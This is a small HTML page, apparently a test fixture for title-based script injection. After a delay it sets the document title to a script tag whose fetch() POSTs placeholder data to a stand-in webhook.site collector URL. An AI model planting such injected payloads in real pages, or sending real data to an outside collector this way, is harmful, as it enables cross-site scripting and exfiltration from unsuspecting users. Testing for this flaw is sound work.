<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Set content script to title</title>
</head>
<body>
    <script>
        setTimeout(() => {
            const scriptContent = `fetch("https://webhook.site/your-unique-url", {method: "POST", body: JSON.stringify({data: "some data"}), headers: {"Content-Type": "application/json"}})`;
            document.title = `<script>${scriptContent}<\/script>`;
        }, 3000);
    </script>
</body>
</html>
